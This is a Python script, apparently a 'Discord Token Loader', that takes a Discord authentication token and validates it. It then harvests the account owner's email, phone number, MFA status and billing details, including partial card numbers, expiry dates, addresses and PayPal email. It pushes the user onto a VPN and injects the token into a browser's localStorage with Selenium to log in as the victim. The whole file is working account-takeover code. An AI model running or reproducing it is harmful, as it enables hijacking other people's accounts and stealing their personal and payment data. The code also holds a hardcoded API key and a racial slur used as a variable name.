from selenium import webdriver
from colorama import init, Fore, Style
import time
import os
import ctypes
from datetime import datetime
from webdriver_manager.chrome import ChromeDriverManager
import requests

ctypes.windll.kernel32.SetConsoleTitleW("Discord Token Loader by OTEMA")
__version__ = 1.9
languages = {
    'da'    : 'Danish, Denmark',
    'de'    : 'German, Germany',
    'en-GB' : 'English, United Kingdom',
    'en-US' : 'English, United States',
    'es-ES' : 'Spanish, Spain',
    'fr'    : 'French, France',
    'hr'    : 'Croatian, Croatia',
    'lt'    : 'Lithuanian, Lithuania',
    'hu'    : 'Hungarian, Hungary',
    'nl'    : 'Dutch, Netherlands',
    'no'    : 'Norwegian, Norway',
    'pl'    : 'Polish, Poland',
    'pt-BR' : 'Portuguese, Brazilian, Brazil',
    'ro'    : 'Romanian, Romania',
    'fi'    : 'Finnish, Finland',
    'sv-SE' : 'Swedish, Sweden',
    'vi'    : 'Vietnamese, Vietnam',
    'tr'    : 'Turkish, Turkey',
    'cs'    : 'Czech, Czechia, Czech Republic',
    'el'    : 'Greek, Greece',
    'bg'    : 'Bulgarian, Bulgaria',
    'ru'    : 'Russian, Russia',
    'uk'    : 'Ukranian, Ukraine',
    'th'    : 'Thai, Thailand',
    'zh-CN' : 'Chinese, China',
    'ja'    : 'Japanese',
    'zh-TW' : 'Chinese, Taiwan',
    'ko'    : 'Korean, Korea'
}

cc_digits = {
    'american express': '3',
    'visa': '4',
    'mastercard': '5'
}



#Functions

def tokens_antiguos():
    # input("TOKENS ANTOGUOS")
    tokens = []

    #Leer tokens previamente guardados en tokens.txt
    
    with open("tokens.txt", "r") as archivo:
        for linea in archivo:
            token = linea.strip()
            tokens.append(token)

    # Eliminar elementos duplicados de la lista de tokens
    tokens_unicos = []
    for token in tokens:
        if token not in tokens_unicos:
            tokens_unicos.append(token)
            

    return tokens_unicos


def token_txt(tokina, username):
    tokens = set()
    tokens = tokens_antiguos()
    
    a = 1
    with open("tokens.txt", "w") as archivo:
        for num in tokens:
            a += 1
        #     print(a,". ", "Token encontrado: ", num)
        #     print()

        # print("El token a añadir es el nº ", a)
        # print("Ahora meto el nuevo token: ")
        # print("NUM: ", a)
        # print("User: ", username)
        # print("Token:", tokina)
        
        tokens.append(str(a) + ". " + username + "--> "+ tokina)
        
        # print("Datos añadidos a la lista, cada linea/elemento es:")
        # for line in tokens:
        #     print(line + "\n")
        
        for line in tokens:
            archivo.write(line + "\n")
                   
    print(f'{PURPLE}El nuevo{RED} token {PURPLE}se han guardado correctamente en el historial.{Fore.RESET}')


def histo_token():
    tokens = tokens_antiguos()

    if len(tokens) > 0:
        num = 0
        for a in tokens:
            num += 1
        print(f'{GREEN}Se han encontrado {num} tokens en tu historial{Fore.RESET}')
        print()
        x = 0
        for token in tokens:
            print(f'{YELLOW}{token}{RESET}')
        
        while True:
            print()
            print(f'{PURPLE}¿Desea seleccionar un token guardado? {PURPLE}({GREEN}y{PURPLE}/{RED}n{PURPLE})-->{RESET} ', end="")
            res = input().lower()
            print()
            if res == "y":
                lista_tokens = list(tokens)
                num = int(input("Introduce nº del token: "))
                num -= len(lista_tokens) + 1
            
                for linea in lista_tokens:
                    indice = linea.find(">")  # encontrar el índice del carácter ">"
                    if indice != -1:  # si se encontró el carácter ">"
                        token = linea[indice+1:].strip()  # obtener la parte de la línea después del ">"
                        lista_tokens.append(token)

                token = lista_tokens[num]
                return token
                
            elif res == "n":
                return False
            else:
                print("Respuesta no válida")
                pass
    else:
        return False     



def clear():
    os.system('cls' if os.name == 'nt' else 'clear')


def animate_text(text, color, sec):
    for char in text:
        # Cambia el color de la letra
        print(color + char, end='', flush=True)
        time.sleep(sec)

    # Resetea el color de la letra
    print(Style.RESET_ALL)

# Inicializar colorama
init()

#Defino los colores
BLUE = Fore.BLUE
RED = Fore.RED 
GREEN= Fore.GREEN
YELLOW = Fore.YELLOW
PURPLE= Fore.MAGENTA
CIAN = Fore.CYAN
RESET = Fore.RESET

def obtener_direccion_ip():
    try:
        response = requests.get('https://ipapi.co/json')
        data = response.json()
        ip = data['ip']
        return ip
    except:
        return "Direccion IP no encontrada"

def verificar_vpn(ip):
    api_key = "f0b7f18a3e7541149ae064d21b443589"
    url = f"https://vpnapi.io/api/{ip}?key={api_key}"
    try:
        response = requests.get(url)
        data = response.json()
        vpn_status = data['security']['vpn']
        return vpn_status
    except:
        return False  # En caso de error, asumimos que no se está utilizando una VPN

def detectar_vpn():
    ip = obtener_direccion_ip()
    if ip:
        vpn_detected = verificar_vpn(ip)
        if vpn_detected:
            return True
        else:
            return False
    else:
        print("No se pudo obtener la dirección IP.")


def espacio():
    for i in range(1):
        print(" ")
        for a in range(24):
            print(GREEN + "-" + Style.RESET_ALL, end="", flush=True)
            print(RED + "-" + Style.RESET_ALL, end="", flush=True)  
            print(BLUE + "-" + Style.RESET_ALL, end="", flush=True)
            print(YELLOW + "-" + Style.RESET_ALL, end="", flush=True)
            print(PURPLE + "-" + Style.RESET_ALL, end="", flush=True)

def loading(pts):
    for i in range(pts):
        time.sleep(0.25)
        print(".", end="", flush=True)



def print_console_VPN():
    # Checkeo de uso de VPN
    print(f'{BLUE}Verificando uso de conexión VPN')
    print()
    while True:
        IP = obtener_direccion_ip()
        print(f'{GREEN}Comprobando si{RED}', IP, f'{GREEN}es una conexión VPN', end="")
        loading(3)
        if detectar_vpn():
            clear()
            animate_text("Conexión VPN encontrada", BLUE, 0.02)
            break
        else:
            clear()
            for i in range(5):
                t = 5 - i
                print(f'{YELLOW}Esta es la dirección IP en uso:{RED}',IP,f'{GREEN}.')
                print()
                print(f'{GREEN}Debes estar conectado a una {BLUE}VPN{GREEN} para realizar esta solicitud.')
                for nigger in range(25):
                    print()
                print(f'Reintentando de nuevo en:{RED}', t, f'{GREEN}segundos.')
                time.sleep(1)
                os.system("cls")



def TokenInfo():
    init(convert=True) # makes console support ANSI escape color codes
    # Pedimos el token al usuario
    Style.RESET_ALL
    # input("EN TOKENiNFO()(Main), para ir a histoToken = histo_token() ENTER")
    histoToken = histo_token()
    if histoToken == False:
        nuevo_token = True
        animate_text("Introduce tu token de Discord: ", GREEN, 0.005)
        Style.RESET_ALL
        token = input()
    else:
        nuevo_token = False
        token = histoToken
    
    clear()
    print(f'Token: {GREEN}{token}{Fore.RESET}')        
    print("Comprobando existencia de la cuenta", end="")
    loading(4)
    print()
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json'
    }
    res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
    if res.status_code == 200: # code 200 if valid
        res_json = res.json()
        user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
        print(f'{Fore.GREEN}[√]{Fore.RESET}¡CUENTA ENCONTRADA!: {Fore.BLUE}{user_name}')
        if nuevo_token:
            # print("Nuevo token detectado, vamos a meterlo al txt, ok?")
            token_txt(token, user_name)
        else:
            # print("No has añadido un nuevo token, con lo cual no hace falta añadirlo al txt")
            pass
        
        print()
        animate_text("Presiona ENTER para obtener la información detallada", GREEN, 0.001)
        
        
        Style.RESET_ALL
        input()
    
        Style.RESET_ALL
        print(Style.RESET_ALL)
        espacio()
        # user info
        
        
        user_id = res_json['id']
        avatar_id = res_json['avatar']
        avatar_url = f'https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}.gif'
        phone_number = res_json['phone']
        email = res_json['email']
        mfa_enabled = res_json['mfa_enabled']
        flags = res_json['flags']
        locale = res_json['locale']
        verified = res_json['verified']
        
        language = languages.get(locale)
        creation_date = datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')
        has_nitro = False
        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
        nitro_data = res.json()
        has_nitro = bool(len(nitro_data) > 0)
        if has_nitro:
            d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
            d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
            days_left = abs((d2 - d1).days)
        # billing info
        billing_info = []
        for x in requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=headers).json():
            y = x['billing_address']
            name = y['name']
            address_1 = y['line_1']
            address_2 = y['line_2']
            city = y['city']
            postal_code = y['postal_code']
            state = y['state']
            country = y['country']
            if x['type'] == 1:
                cc_brand = x['brand']
                cc_first = cc_digits.get(cc_brand)
                cc_last = x['last_4']
                cc_month = str(x['expires_month'])
                cc_year = str(x['expires_year'])
                
                data = {
                    'Payment Type': 'Credit Card',
                    'Valid': not x['invalid'],
                    'CC Holder Name': name,
                    'CC Brand': cc_brand.title(),
                    'CC Number': ''.join(z if (i + 1) % 2 else z + ' ' for i, z in enumerate((cc_first if cc_first else '*') + ('*' * 11) + cc_last)),
                    'CC Exp. Date': ('0' + cc_month if len(cc_month) < 2 else cc_month) + '/' + cc_year[2:4],
                    'Address 1': address_1,
                    'Address 2': address_2 if address_2 else '',
                    'City': city,
                    'Postal Code': postal_code,
                    'State': state if state else '',
                    'Country': country,
                    'Default Payment Method': x['default']
                }
            elif x['type'] == 2:
                data = {
                    'Payment Type': 'PayPal',
                    'Valid': not x['invalid'],
                    'PayPal Name': name,
                    'PayPal Email': x['email'],
                    'Address 1': address_1,
                    'Address 2': address_2 if address_2 else '',
                    'City': city,
                    'Postal Code': postal_code,
                    'State': state if state else '',
                    'Country': country,
                    'Default Payment Method': x['default']
                }
            billing_info.append(data)
        print('Basic Information')
        print('-----------------')
        print(f'    {Fore.RESET}Username               {Fore.GREEN}{user_name}')
        print(f'    {Fore.RESET}User ID                {Fore.GREEN}{user_id}')
        print(f'    {Fore.RESET}Creation Date          {Fore.GREEN}{creation_date}')
        print(f'    {Fore.RESET}Avatar URL             {Fore.GREEN}{avatar_url if avatar_id else ""}')
        print(f'    {Fore.RESET}Token                  {Fore.GREEN}{token}')
        print(f'{Fore.RESET}\n')
        
        print('Nitro Information')
        print('-----------------')
        print(f'    {Fore.RESET}Nitro Status           {Fore.MAGENTA}{has_nitro}')
        if has_nitro:
            print(f'    {Fore.RESET}Expires in             {Fore.MAGENTA}{days_left} day(s)')
        print(f'{Fore.RESET}\n')
        print('Contact Information')
        print('-------------------')
        print(f'    {Fore.RESET}Phone Number           {Fore.YELLOW}{phone_number if phone_number else ""}')
        print(f'    {Fore.RESET}Email                  {Fore.YELLOW}{email if email else ""}')
        print(f'{Fore.RESET}\n')
        if len(billing_info) > 0:
            print('Billing Information')
            print('-------------------')
            if len(billing_info) == 1:
                for x in billing_info:
                    for key, val in x.items():
                        if not val:
                            continue
                        print(Fore.RESET + '    {:<23}{}{}'.format(key, Fore.CYAN, val))
            else:
                for i, x in enumerate(billing_info):
                    title = f'Payment Method #{i + 1} ({x["Payment Type"]})'
                    print('    ' + title)
                    print('    ' + ('=' * len(title)))
                    for j, (key, val) in enumerate(x.items()):
                        if not val or j == 0:
                            continue
                        print(Fore.RESET + '        {:<23}{}{}'.format(key, Fore.CYAN, val))
                    if i < len(billing_info) - 1:
                        print(f'{Fore.RESET}\n')
            print(f'{Fore.RESET}\n')
        print('Account Security')
        print('----------------')
        print(f'    {Fore.RESET}2FA/MFA Enabled        {Fore.BLUE}{mfa_enabled}')
        print(f'    {Fore.RESET}Flags                  {Fore.BLUE}{flags}')
        print(f'{Fore.RESET}\n')
        print('Other')
        print('-----')
        print(f'    {Fore.RESET}Locale                 {Fore.RED}{locale} ({language})')
        print(f'    {Fore.RESET}Email Verified         {Fore.RED}{verified}')
        espacio()
        return token
    elif res.status_code == 401: # code 401 if invalid
        print(f'{Fore.RED}[-] {Fore.RESET}El token introducido no es valido')
        return False
    else:
        print(f'{Fore.RED}[-] {Fore.RESET}No se pudo comprobar en tola data base, pero aun así puedes iniciar sesion si quieres')
        print("1 o 2")
        r = input()
        if r == 1:
            return token
        elif r == 2:
            return False
        else:
            print("Me lo tomaré como un no")
            return False


clear()
animate_text("T h i s   l o a d e r   h a s   b e e n   c r e a t e d   b y   o t e m a", RED, 0.008)
time.sleep(0.5)
clear()

if str(input(f'{Fore.LIGHTBLACK_EX}ENTER to continue ("y" to bypass vpn)\n')) == "y":
    clear()
else:
    clear()
    print_console_VPN()

while True:
    token = TokenInfo()
    if token != False:
        break
    else:
        print("Intentalo de nuevo")
        
Style.RESET_ALL
print(Style.RESET_ALL)
print()
animate_text("Presiona ENTER para continuar", GREEN, 0.001)
input()

# Elegimos el navegador
clear()
animate_text("Qué navegador desea usar?", GREEN, 0.002)
print()
animate_text("1. Google Chrome", PURPLE, 0.0005)
animate_text("2. Brave Browser", YELLOW, 0.0005)
animate_text("3. Firefox", RED, 0.001)
print()
animate_text("4. Salir", CIAN, 0.001)
espacio()

print()

while True:
    nav = int(input())
    if nav == 1:
        print()
        print(f'{GREEN}Navegador ejecutado:     ',  end="")
        animate_text("G O O G L E  C H R O M E", BLUE, 0.05)
        print()
        
# Configuramos el navegador GOOGLE CHROME
        options = webdriver.ChromeOptions()
        options.add_argument('--disable-extensions')
        options.add_argument('--profile-directory=Default')
        options.add_argument("--disable-plugins-discovery")
        options.add_argument("--start-maximized")
        options.add_argument("--incognito")
        # driver = webdriver.Chrome(options=options)
        driver = webdriver.Chrome(ChromeDriverManager().install(), options=options)
        break
    elif nav == 2:
        print()
        print(f'{GREEN}Navegador ejecutado:     ',  end="")
        animate_text("B R A V E  B R O W S E R", BLUE, 0.05)
        print()
        
        # Configuramos el navegador Brave Browser
        options = webdriver.ChromeOptions()
        options.binary_location = 'C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe'
        options.add_argument('--disable-extensions')
        options.add_argument('--profile-directory=Default')
        options.add_argument("--disable-plugins-discovery")
        options.add_argument("--start-maximized")
        options.add_argument("--incognito")
        # driver = webdriver.Chrome(options=options)
        driver = webdriver.Chrome(ChromeDriverManager().install(), options=options)
        break
    elif nav == 3:
        print()
        print("Navegador ejecutado:     ", end="")
        animate_text("F I R E F O X", BLUE, 0.05)
        print()
        
        # Configuramos el navegador Firefox
        options = webdriver.FirefoxOptions()
        options.add_argument('--start-maximized')
        options.add_argument("--start-maximized")
        options.add_argument('--private-window')
        driver = webdriver.Firefox(options=options)
        break
    elif nav == 4:
        clear()
        # Cerramos el navegador
        print(f'{GREEN}Cerrando sesión.', end="")
        loading(3)
        exit()
    else:
        animate_text("Respuesta no válida!!", RED, 0)
        print()
        continue



# Abrimos la página de Discord
driver.get("https://discord.com/login")

# Esperamos a que la página cargue completamente
driver.implicitly_wait(7)

# Ejecutamos el código JavaScript para iniciar sesión
script = f'''
function login(token) {{
  setInterval(() => {{
    document.body.appendChild(document.createElement('iframe')).contentWindow.localStorage.token = `"${{token}}"`
  }}, 50);
  setTimeout(() => {{
    location.reload();
  }}, 2500);
}}

login('{token}')
'''
driver.execute_script(script)
clear()
animate_text("TOKEN SUCCESSFULLY INJECTED", BLUE, 0.02)

# Mantenemos la sesión abierta hasta que el usuario la cierre
print(Fore.RED + "Presiona ENTER para cerrar la sesión")
input()
# Cerramos el navegador
print(f'{GREEN}Cerrando sesión.', end="")
loading(3)

driver.quit()